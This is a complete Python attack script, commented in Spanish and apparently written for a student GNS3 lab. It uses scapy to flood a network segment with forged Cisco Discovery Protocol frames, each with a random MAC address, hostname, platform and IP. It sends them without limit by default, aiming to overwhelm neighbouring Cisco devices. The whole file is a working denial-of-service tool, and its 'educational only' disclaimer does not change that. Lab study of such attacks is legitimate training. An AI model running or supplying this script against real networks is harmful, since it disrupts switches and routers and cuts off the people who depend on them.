#!/usr/bin/env python3
"""
CDP DoS Attack Script
Practica de Seguridad de Redes - GNS3
Matricula: 2024-1185
SOLO PARA FINES EDUCATIVOS EN LABORATORIO CONTROLADO
"""

from scapy.all import *
from scapy.contrib.cdp import *
import random, time, argparse, sys, os

def random_mac():
    """Genera una direccion MAC aleatoria."""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

def random_device_id():
    """Genera un hostname de dispositivo Cisco falso."""
    prefixes = ["Router", "Switch", "SW", "RT", "CORE", "DIST", "ACCESS"]
    return f"{random.choice(prefixes)}-{random.randint(100, 9999)}"

def random_platform():
    """Genera una plataforma Cisco falsa."""
    platforms = [
        "cisco WS-C3750X-48P",
        "cisco WS-C2960X-24TS",
        "cisco CISCO2911/K9",
        "cisco ASR1001-X",
        "cisco C9300-48P",
    ]
    return random.choice(platforms)

def build_cdp_packet(src_mac, device_id, ip, platform):
    """Construye un frame Ethernet con payload CDP completo."""
    eth  = Dot3(dst="01:00:0c:cc:cc:cc", src=src_mac)
    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    snap = SNAP(OUI=0x00000c, code=0x2000)

    cdp = CDPv2_HDR() \
        / CDPMsgDeviceID(val=device_id) \
        / CDPMsgSoftwareVersion(val="Version 15.2(4)M7") \
        / CDPMsgPlatform(val=platform) \
        / CDPMsgPortID(iface="GigabitEthernet0/0") \
        / CDPMsgCapabilities(cap="Router+Switch") \
        / CDPMsgAddr(addr=[CDPAddrRecordIPv4(addr=ip)])

    return eth / llc / snap / cdp

def random_ip():
    return "10.%d.%d.%d" % (random.randint(1,254), random.randint(1,254), random.randint(1,254))

def cdp_dos_attack(interface, packet_count, delay, verbose):
    print(f"\n{'='*55}")
    print(f"  CDP DoS Attack")
    print(f"  Matricula : 2024-1185")
    print(f"  Interfaz  : {interface}")
    print(f"  Paquetes  : {'Infinito' if packet_count == 0 else packet_count}")
    print(f"  Delay     : {delay}s entre paquetes")
    print(f"{'='*55}\n")

    sent  = 0
    start = time.time()

    try:
        while True:
            if packet_count != 0 and sent >= packet_count:
                break

            src_mac   = random_mac()
            device_id = random_device_id()
            ip        = random_ip()
            platform  = random_platform()

            try:
                pkt = build_cdp_packet(src_mac, device_id, ip, platform)
                sendp(pkt, iface=interface, verbose=False)
                sent += 1

                if verbose or sent % 100 == 0:
                    elapsed = time.time() - start
                    pps     = sent / elapsed if elapsed > 0 else 0
                    print(f"[+] Enviados: {sent:>6} | {pps:>7.1f} pkt/s | {device_id} ({ip})")

                if delay > 0:
                    time.sleep(delay)

            except Exception as e:
                print(f"[!] Error: {e}")
                continue

    except KeyboardInterrupt:
        pass

    elapsed = time.time() - start
    print(f"\n{'='*55}")
    print(f"  Total    : {sent} paquetes")
    print(f"  Tiempo   : {elapsed:.1f}s")
    print(f"  Promedio : {sent/elapsed:.1f} pkt/s")
    print(f"{'='*55}\n")

def main():
    if os.geteuid() != 0:
        print("[!] Ejecuta con sudo")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="CDP DoS Attack - Matricula 2024-1185")
    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red (ej: eth0)")
    parser.add_argument("-c", "--count",     type=int,   default=0,   help="Num paquetes (0=infinito)")
    parser.add_argument("-d", "--delay",     type=float, default=0.0, help="Delay entre paquetes (seg)")
    parser.add_argument("-v", "--verbose",   action="store_true",      help="Mostrar cada paquete")
    args = parser.parse_args()

    cdp_dos_attack(args.interface, args.count, args.delay, args.verbose)

if __name__ == "__main__":
    main()
